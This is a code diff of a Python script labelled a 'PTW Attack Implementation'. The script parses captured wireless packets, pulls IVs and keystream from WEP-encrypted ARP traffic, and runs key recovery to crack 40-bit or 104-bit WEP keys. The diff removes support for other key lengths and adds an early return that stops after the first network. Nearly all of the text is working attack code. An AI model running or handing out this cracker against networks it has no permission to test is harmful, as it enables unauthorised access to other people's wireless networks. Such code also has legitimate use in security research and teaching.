@@ -331,9 +331,6 @@ def printkey(key, keylen: int):
 def isvalidpkt(pkt):
     return ((len(pkt[0]) == 86 or len(pkt[0]) == 68) and bytes(pkt[0])[0] == 8)
 
-# Supported key lengths in bytes: 40-bit (5), 64-bit (8), 104-bit (13), 128-bit (16), 152-bit (19), 256-bit (32)
-KEY_LENGTHS = [5, 8, 13, 16, 19, 32]
-
 def main():
     parser = argparse.ArgumentParser(description="PTW Attack Implementation")
     parser.add_argument("capturefile", help="Path to the capture file")
@@ -352,70 +349,60 @@ def main():
     numstates = 0
     total_tested_keys = 0
     total_ivs = 0
-
     try:
         for pkt in pcap:
-            if not isvalidpkt(pkt):
-                continue  # Skip invalid packets
+            if isvalidpkt(pkt):
+                # Packet is ARP
+                currenttable = -1
+                for k in range(len(networktable)):
+                    if networktable[k].bssid == pkt[0].addr2 and networktable[k].keyid == pkt[1].keyid:
+                        currenttable = k
 
-            # Ensure the packet has enough layers
-            if len(pkt) < 2 or not hasattr(pkt[1], "iv") or not hasattr(pkt[1], "wepdata"):
-                continue  # Skip if necessary fields are missing
+                if currenttable == -1:
+                    # Allocate new table
+                    print("Allocating a new table")
+                    print("bssid = " + str(pkt[0].addr2) + " keyindex=" + str(pkt[1].keyid))
+                    numstates += 1
+                    networktable.append(network())
+                    networktable[numstates-1].state = newattackstate()
+                    networktable[numstates-1].bssid = pkt[0].addr2
+                    networktable[numstates-1].keyid = pkt[1].keyid
+                    currenttable = numstates - 1
 
-            currenttable = -1
-            for k in range(len(networktable)):
-                if (
-                    hasattr(pkt[0], "addr2")
-                    and hasattr(pkt[1], "keyid")
-                    and networktable[k].bssid == pkt[0].addr2
-                    and networktable[k].keyid == pkt[1].keyid
-                ):
-                    currenttable = k
+                iv = pkt[1].iv
+                # Get known plaintext
+                arp_known = ARP_HEADER
+                if pkt[0].addr1 == BROADCAST_MAC or pkt[0].addr3 == BROADCAST_MAC:
+                    arp_known += ARP_REQUEST
+                else:
+                    arp_known += ARP_RESPONSE
 
-            if currenttable == -1 and hasattr(pkt[0], "addr2") and hasattr(pkt[1], "keyid"):
-                # Allocate new table
-                print(f"Allocating a new table for BSSID = {pkt[0].addr2}, key index = {pkt[1].keyid}")
-                numstates += 1
-                networktable.append(network())
-                networktable[numstates - 1].state = newattackstate()
-                networktable[numstates - 1].bssid = pkt[0].addr2
-                networktable[numstates - 1].keyid = pkt[1].keyid
-                currenttable = numstates - 1
-
-            if currenttable == -1:
-                continue  # Skip if no valid table was found or created
-
-            iv = pkt[1].iv
-            # Get known plaintext
-            arp_known = ARP_HEADER
-            if pkt[0].addr1 == BROADCAST_MAC or pkt[0].addr3 == BROADCAST_MAC:
-                arp_known += ARP_REQUEST
-            else:
-                arp_known += ARP_RESPONSE
-
-            keystream = GetKeystream(pkt[1].wepdata, arp_known)
-            addsession(networktable[currenttable].state, iv, keystream)
-            total_ivs += 1
+                keystream = GetKeystream(pkt[1].wepdata, arp_known)
+                addsession(networktable[currenttable].state, iv, keystream)
+                total_ivs += 1
 
         print("Analyzing packets")
         for k in range(len(networktable)):
-            print(f"BSSID = {networktable[k].bssid}, Key Index = {networktable[k].keyid}, Packets = {networktable[k].state.packets_collected}")
-            
-            for key_len in KEY_LENGTHS:
-                print(f"Checking for {key_len * 8}-bit key")
-                if computekey(networktable[k].state, key, key_len, KEYLIMIT // 10 if key_len < 13 else KEYLIMIT):
-                    printkey(key, key_len)
-                    return
+            print("bssid = " + str(networktable[k].bssid) + " keyindex=" + str(networktable[k].keyid) + " packets=" + str(networktable[k].state.packets_collected))
+            print("Checking for 40-bit key")
+            if computekey(networktable[k].state, key, 5, KEYLIMIT / 10) == 1:
+                printkey(key, 5)
+                return
+            print("Checking for 104-bit key")
+            if computekey(networktable[k].state, key, 13, KEYLIMIT) == 1:
+                printkey(key, 13)
+                return
 
             print("Key not found")
+            return
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(e)
 
     print(f"[{total_tested_keys}] Tested {total_tested_keys} keys (got {total_ivs} IVs)")
 
 networktable = []
-key = [None] * max(KEY_LENGTHS)  # Adjusted for the longest key size
+key = [None] * MAINKEYBYTES
 
 if __name__ == "__main__":
     main()
